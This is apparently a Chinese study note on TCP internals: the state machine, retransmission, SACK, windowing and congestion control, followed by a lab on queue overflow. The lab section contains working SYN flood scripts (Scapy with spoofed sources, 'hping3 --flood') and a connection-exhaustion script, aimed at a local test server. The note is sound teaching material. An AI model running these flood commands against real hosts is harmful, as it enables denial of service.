---
description: TCP protocol
---

# TCP

## Introduction
### OSI 七层网络模型 
MTU（Maximum Transmission Unit）：网络设备或接口数据包最大值
MSS (Maximum Segment Size)：TCP 段最大值

+ 物理层（Physical Layer）
报文名称：Bit（位）

+ 数据链路层（Data Link Layer）
报文名称：Frame（帧）
协议：Ethernet、Wi-Fi (IEEE 802.11)
Ethernet MTU = 46~1518 Bytes 

+ 网络层（Network Layer）
报文名称：Packet（包）
协议：IP、ICMP、BGP
IP MTU = 1518 - 14(Frame Header) - 4(CRC) = 1500 Bytes

+ 传输层（Transport Layer）
报文名称：Segment（段）OR Datagram（报）
协议：TCP、UDP
MSS = 1500(Ethernet MTU) - 20(IP Header) - 20(TCP Header) = 1460 Bytes

+ 会话层（Session Layer）
报文名称：DataStream（数据流）

+ 表示层（Presentation Layer）
报文名称：Message（消息）
协议：SSL/TLS

+ 应用层（Application Layer）
报文名称：Message（报文）
协议：HTTP、SMTP、SSH、Telnet


### TCP 报文头格式
![[/Operations/Network/attachements/Pasted image 20230905091738.png]]
一个TCP连接使用五元组定义同一个连接（src_ip, src_port, dst_ip, dst_port, protocol）
+ Sequence Number是包的序号，用来解决网络包乱序（reordering）问题。
+ Acknowledgement Number就是ACK——用于确认收到，用来解决不丢包的问题。
+ Window又叫Advertised-Window，也就是著名的滑动窗口（Sliding Window），用于解决流控的。
+ TCP Flag, 也就是包的类型，主要是用于操控TCP的状态机的。


### TCP 状态机
![[/Operations/Network/attachements/Pasted image 20230905101408.png]]

![[/Operations/Network/attachements/Pasted image 20230905101422.png]]
+ 对于建链接的3次握手，主要是要初始化Sequence Number 的初始值。通信的双方要互相通知对方自己的初始化的Sequence Number（缩写为ISN：Inital Sequence Number）——所以叫SYN，全称Synchronize Sequence Numbers。也就上图中的 x 和 y。这个号要作为以后的数据通信的序号，以保证应用层接收到的数据不会因为网络上的传输的问题而乱序（TCP会用这个序号来拼接数据）。
+ 对于4次挥手，其实你仔细看是2次，因为TCP是全双工的，所以，发送方和接收方都需要Fin和Ack。只不过，有一方是被动的，所以看上去就成了所谓的4次挥手。如果两边同时断连接，那就会就进入到CLOSING状态，然后到达TIME_WAIT状态。下图是双方同时断连接的示意图（你同样可以对照着TCP状态机看）
![[/Operations/Network/attachements/Pasted image 20230905101514.png]]
注意事项：
+ SYN_RECV 状态：server 端收不到建连的 ACK 包，重发 Syn+Ack 包。**Linux 中默认重试5次，从1s开始每次翻倍，总共 1s + 2s + 4s + 8s+ 16s + 32s = 2^6 -1 = 63s，63s 超时后 TCP 才断开连接**。优化参数：1）tcp_synack_retries 减少重试次数。2）tcp_max_syn_backlog 与 net.core.somaxconn 增大 SYN 半连接队列。3）tcp_abort_on_overflow 全连接队列满拒绝连接扔掉 Ack、tcp_syncookies 通过五元组 hash 一个 cookie 返回，客户端发回时携带过来建立连接（不建议开启）
+ ISN 初始化：ISN 会和一个假的时钟绑在一起，这个时钟会在每4微秒对 ISN 做加一操作，直到超过2^32，又从0开始。一个 ISN 的周期大约是4.55个小时。假设 TCP Segment 在网络上的存活时间不会超过 Maximum Segment Lifetime（MSL），所以只要 MSL 的值小于4.55小时就不会重用 ISN
+ MSL 与 TIME_WAIT：TIME_WAIT 状态到 CLOSED 状态超时设置为 2\*MSL（RFC793定义了MSL为2分钟，Linux设置为30s 内核参数 net.ipv4.tcp_fin_timeout）。原因：1）TIME_WAIT 确保有足够的时间让对端收到了 ACK，如果被动关闭的那方没有收到 Ack，就会触发被动端重发 Fin，一来一去正好2个 MSL。2）有足够的时间让这个连接不会跟后面的连接混在一起（如果连接被重用了，那么这些延迟收到的包就有可能会跟新连接混在一起）
+ TIME_WAIT 数量过多：作为 client 端高并发短连接下，TIME_WAIT 状态太多。优化参数：1）tcp_tw_reuse 重用连接，需同时开启 tcp_timestamps=1（不太建议开启）。2）tcp_tw_recycle 假设对端开启了 tcp_timestamps 并比较时间戳重用连接，高版本已废弃。3）tcp_max_tw_buckets TIME_WAIT 状态数量，默认值180000，超过时系统 destory 打印警告

**TIME_WAIT 状态只存在主动断开连接一端，HTTP 服务器建议开启 keepalive（浏览器会重用一个 TCP 连接来处理多个 HTTP 请求，http/1.1 版本以上默认开启），由客户端主动断开连接**


### 数据传输中的 Sequence Number
wireshark filter expression: ip.addr == 172.22.3.29 && tcp.port == 9000
![[/Operations/Network/attachements/Pasted image 20230906170656.png]]

![[/Operations/Network/attachements/Pasted image 20230906171805.png]]
SeqNum的增加是和传输的字节数相关的。

注意：Wireshark 为了显示更友好，使用了 Relative SeqNum——相对序号，你只要在右键菜单中的protocol preference 中取消掉就可以看到“Absolute SeqNum”了。


### TCP 重传机制
注：接收端给发送端的ACK确认只会确认最后一个连续的包
1、超时重传机制：1-5五份数据，第3份数据收不到时
- 仅重传丢失 timeout 的包，也就是第3份（节省带宽，慢）
- 重传 timeout 之后所有包，3 4 5三份数据（好一点，浪费带宽）

2、快速重传机制
Fast Retransmit 算法，不以时间驱动，以数据驱动重传。只ack最后可能丢的那个包。第一份先到送了，于是就ack回2，结果2因为某些原因没收到，3到达了，于是还是ack回2，后面的4和5都到了，但是还是ack回2，因为2还是没有收到，于是发送端收到了三个ack=2的确认，知道了2还没有到，于是就马上重转2。然后，接收端收到了2，此时因为3，4，5都收到了，于是ack回6
![[/Operations/Network/attachements/Pasted image 20230906172736.png]]
问题：重传是重传 ACK 丢失的包还是之前的所有包？

3、Selective Acknowledgment（SACK）：需要在 TCP 头里加一个 SACK 的东西，ACK 还是 Fast Retransmit 的 ACK，SACK 则是汇报收到的数据碎版
![[/Operations/Network/attachements/Pasted image 20230906172757.png]]
在发送端就可以根据回传的 SACK 来知道哪些数据到了，哪些没有到。于是就优化了 Fast Retransmit 的算法。当然，这个协议需要两边都支持。
**Linux 内核参数 net.ipv4.tcp_sack=1 开启该功能**
注意：接收方 Reneging 问题，接收方有权扔掉发送方的 SACK 数据。接收方可能需要内存给更重要的东西，所以发送方不能完全依赖 SACK，还需要 ACK 并维护 Time-Out，如果后续的 ACK 没有增长依然需要重传 SACK 的数据。

4、Duplicate SACK（D-SACK）：重复收到数据的问题，其主要使用了SACK来告诉发送方有哪些数据被重复接收了
- ACK 丢包：SACK 的第一个段的范围被 ACK 所覆盖，那么就是 D-SACK。如图所示请求中丢了两个 ACK 包（3500，4000），第三个包返回 ACK=4000 SACK=3000-3500，则这个 SACK 为 D-SACK 包，说明数据没丢而是 ACK 包丢了。
![[/Operations/Network/attachements/Pasted image 20230907091907.png]]
- 网络延误：SACK 的第一个段的范围被 SACK 的第二个段覆盖，那么就是 D-SACK。如图所示，网络包（1000-1499）被网络给延误了，导致发送方没有收到 ACK，而后面到达的三个包触发了“Fast Retransmit算法”，所以重传，但重传时被延误的包又到了，所以回了一个SACK=1000-1500，因为 ACK 已到了3000，所以，这个 SACK 是 D-SACK——标识收到了重复的包。
这个案例下，发送端知道之前因为“Fast Retransmit算法”触发的重传不是因为发出去的包丢了，也不是因为回应的 ACK 包丢了，而是因为网络延时了。
**Linux 内核参数 net.ipv4.tcp_dsack=1 开启该功能**
![[/Operations/Network/attachements/Pasted image 20230907091442.png]]
使用 D-SACK 好处：
1）可以让发送方知道，是发出去的包丢了，还是回来的 ACK 包丢了。
2）是不是自己的 timeout 太小了，导致重传。
3）网络上出现了先发的包后到的情况（又称 reordering）
4）网络上是不是把数据包给复制了


### TCP RTT算法
RTT（Round Trip Time）：数据包从发送到ACK回来的时间，发送端发包时间是t0，ACK接收到时间是t1，RTT采样=t1-t0

RTO（Retransmission TimeOut）：TCP 的 TimeOut 设置，让重传高效

算法：经典算法（加权移动平均）、Karn / Partridge 算法、Karn / Partridge 算法


### TCP 滑动窗口 - Sliding Window
TCP 头中字段 Window(Advertised-Window)：接收端告诉发送端自己还有多少缓冲区可以接收数据
![[/Operations/Network/attachements/Pasted image 20230907171639.png]]
- 接收端LastByteRead指向了TCP缓冲区中读到的位置，NextByteExpected指向的地方是收到的连续包的最后一个位置，LastByteRcved指向的是收到的包的最后一个位置，我们可以看到中间有些数据还没有到达，所以有数据空白区。
- 发送端的LastByteAcked指向了被接收端Ack过的位置（表示成功发送确认），LastByteSent表示发出去了，但还没有收到成功确认的Ack，LastByteWritten指向的是上层应用正在写的地方
于是：
- 接收端在给发送端回ACK中会汇报自己的AdvertisedWindow = MaxRcvBuffer – LastByteRcvd – 1;
- 而发送方会根据这个窗口来控制发送数据的大小，以保证接收方可以处理

发送方滑动窗口示例：
滑动前
![[/Operations/Network/attachements/Pasted image 20230908140914.png]]
滑动后
![[/Operations/Network/attachements/Pasted image 20230908141002.png]]

![[/Operations/Network/attachements/Pasted image 20230908141907.png]]

#### Zero window
发送端在窗口变成0后，会发 ZWP 的包给接收方，让接收方来 ack 他的 Window 尺寸，一般这个值会设置成3次，每次大约30-60秒（不同的实现可能会不一样）。如果3次过后还是0的话，有的 TCP 实现就会发 RST 把链接断了。

注意：只要有等待的地方都可能出现 DDoS 攻击，Zero Window 也不例外，一些攻击者会在和HTTP 建好链发完 GET 请求后，就把 Window 设置为0，然后服务端就只能等待进行 ZWP，于是攻击者会并发大量的这样的请求，把服务器端的资源耗尽。

Wireshark中，可以使用 tcp.analysis.zero_window 来过滤包，然后使用右键菜单里的follow TCP stream，你可以看到 ZeroWindowProbe 及 ZeroWindowProbeAck 的包


#### Silly Window Syndrome
接收方太忙了，来不及取走Receive Windows里的数据，那么，就会导致发送方越来越小。到最后，如果接收方腾出几个字节并告诉发送方现在有几个字节的window，而我们的发送方会义无反顾地发送这几个字节。MSS=1460，这样发送携带 IP 头与 TCP 头浪费带宽。
解决办法：避免对小的window size做出响应，直到有足够大的window size再响应。可以 receiver 和 sender 同时实现。
+ 在 receiver 端，如果收到的数据导致 window size 小于某个值，可以直接 ack(0)回sender，这样就把 window 给关闭了，也阻止了 sender 再发数据过来，等到 receiver 端处理了一些数据后windows size 大于等于了MSS，或者，receiver buffer有一半为空，就可以把window打开让 sender 发送数据过来。
+ Sender 端引起的，那么就会使用著名的 Nagle’s algorithm。这个算法的思路也是延时处理，他有两个主要的条件：1）要等到 Window Size>=MSS 或是 Data Size >=MSS，2）收到之前发送数据的 ack 回包，他才会发数据，否则就是在攒数据。


### TCP 拥塞处理 - Congestion Handling
1）慢启动
1. 连接建好的开始先初始化 cwnd = 1，表明可以传一个 MSS 大小的数据。
2. 每当收到一个 ACK，cwnd++；呈线性上升
3. 每当过了一个 RTT，cwnd = cwnd\*2；呈指数上升
4. ssthresh（slow start threshold）阈值。当 cwnd >= ssthresh 时，就会进入“拥塞避免算法”

2）拥塞避免
一般来说ssthresh的值是65535，单位是字节，当cwnd达到这个值时后，算法如下：
1. 收到一个ACK时，cwnd = cwnd + 1/cwnd
2. 当每过一个RTT时，cwnd = cwnd + 1

3）拥塞发生（快速重传）
1. 等到RTO超时，重传数据包。TCP认为这种情况太糟糕，反应也很强烈。
- sshthresh = cwnd /2
- cwnd 重置为 1
- 进入慢启动算法
2. Fast Retransmit算法，也就是在收到3个duplicate ACK时就开启重传，而不用等到RTO超时。
- TCP Tahoe 的实现和 RTO 超时一样。
- TCP Reno的实现是：
	- cwnd = cwnd / 2
	- sshthresh = cwnd
	- 进入快速恢复算法——Fast Recovery

4）快速恢复
1. cwnd = sshthresh + 3 \* MSS（3的意思是确认有3个数据包被收到了）
2. 重传 Duplicated ACKs 指定的数据包
3. 如果再收到 duplicated Acks，那么 cwnd = cwnd +1
4. 如果收到了新的Ack，那么，cwnd = sshthresh ，然后就进入了拥塞避免的算法了。

算法示意图
![[/Operations/Network/attachements/Pasted image 20230908161112.png]]


## TCP 全连接与半连接队列
### 半连接队列溢出 & SYN Flood
测试使用 tcp-server 端
```bash
cat > simple-tcp-server.c << "EOF"
#include <stdio.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <sys/socket.h>
#define PORT 8877
#define SA struct sockaddr

int main()
{
  int sockfd, connfd, len;
  struct sockaddr_in servaddr = {};

  // socket create and verification
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == -1) {
    printf("socket creation failed...\n");
    exit(0);
  }

  // assign IP, PORT
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(PORT);

  // Binding newly created socket to given IP and verification
  if ((bind(sockfd, (SA*)&servaddr, sizeof(servaddr))) != 0) {
    printf("Failed to bind socket\n");
    exit(0);
  }

  // Now server is ready to listen and verification
  // 半连接队列测试：backlog = 8
  // 全连接队列测试：backlog = 1
  if ((listen(sockfd, 8)) != 0) {
    printf("Listen failed\n");
    exit(0);
  }

  printf("Server listening...\n");

  while (1)
  {
      // Don't accept
	  sleep(10);
	  
	  //// Accept the data packet from client and verification
      //connfd = accept(sockfd, (SA *)NULL, NULL);
      //if (connfd == -1)
      //{
      //    printf("Server accept failed...\n");
      //    exit(0);
      //}

      //// Function for receiving data from client and sending it back
      //char buffer[1024];
      //int n = read(connfd, buffer, sizeof(buffer));
      //buffer[n] = '\0';
      //printf("Client message: %s\n", buffer);

      // Close the connection
      close(connfd);
  }

  // Close the socket
  close(sockfd);

  return 0;
}
EOF

# compile and run
gcc -o ststest simple-tcp-server.c
./ststest
```

```bash
# 调整并关闭相关参数
iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.core.somaxconn=128
sysctl -w net.ipv4.tcp_max_syn_backlog=256


# attack option1: python scary imitate syn attack
pip intall scary
scary
>>>
from time import sleep
from random import randint
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
conf.L3socket=L3RawSocket
def attack():
  while True:
    ip.src=f"127.0.0.{randint(0, 255)}"
    send(ip/tcp)
    sleep(0.01)
attack()
# attack option2: hping3 imitate syn attack
apt install hping3
hping3 -S -p 8877 --flood 127.0.0.1


# verify
# 查看是否只有 syn 与 syn+ack 包
tcpdump -tn -i lo port 8877
# 查看 SYN-RECV 状态 TCP 连接数量
ss -tna |grep 8877 
LISTEN    0      8                   0.0.0.0:8877                 0.0.0.0:*                                                                                     
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2022                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2025                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2029                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2026                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2024                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2028                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2027                                                                                  
SYN-RECV  0      0                 127.0.0.1:8877               127.0.0.1:2023                                                                                  
# 查看 TCP 连接因为半连接队列溢出而被丢弃(数据包数量递增)
netstat -s |grep SYNs
87414 SYNs to LISTEN sockets dropped
# 此时已无法建立新的 tcp 连接
telnet 127.0.0.1 8877

```


### 全连接队列溢出
```bash
# 调整并关闭相关参数
sysctl -w net.ipv4.tcp_syncookies=0
sysctl -w net.ipv4.tcp_abort_on_overflow=0


# nginx
server {
    listen       9999 backlog=10;
...


# attack option1: python scary imitate syn attack
scary
>>>
ip = IP(dst="127.0.0.1")
tcp = TCP(dport=8877, flags="S")
idx = 2
conf.L3socket=L3RawSocket
def connect():
  global idx
  ip.src = f"127.0.0.{ idx }"
  synack = sr1(ip/tcp)
  ack = TCP(sport=synack.dport, dport=synack.sport, flags="A", seq=100, ack=synack.seq + 1)
  send(ip/ack)
  idx += 1
connect()
connect()
...
# attack option2: wrk or telnet
wrk -t 10 -c 30000 -d 30 http://nginx_server:9999 # node1
telnet 172.22.3.29 8877  # node1
telnet 172.22.3.29 8877  # node2
telnet 172.22.3.29 8877  # node3, haven't connect


# verify
# 查看 TCP 已建连数量（内核判断 > min(somaxconn,backlog)）
ss -tna |grep 8877 
LISTEN    2      1                   0.0.0.0:8877                 0.0.0.0:*                                                                                     
ESTAB     0      0                 127.0.0.1:8877               127.0.0.1:20                                                                                    
ESTAB     0      0                 127.0.0.1:8877               127.0.0.2:20                                                                                    
# 查看全连接队列溢出次数
netstat -s |grep overflowed
    5 times the listen queue of a socket overflowed
# 此时再调用 connect 已无法建立新的 tcp 连接
connect()
```



> Reference:
> 1. [从一次Connection Reset 说起](https://cjting.me/2019/08/28/tcp-queue/#%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA--syn-flood)
> 2. [小林Coding：半连接队列与全连接队列](https://www.xiaolincoding.com/network/3_tcp/tcp_queue.html#%E5%AE%9E%E6%88%98-tcp-%E5%8D%8A%E8%BF%9E%E6%8E%A5%E9%98%9F%E5%88%97%E6%BA%A2%E5%87%BA)
> 3. [COOLSHELL](https://coolshell.cn/articles/11609.html)
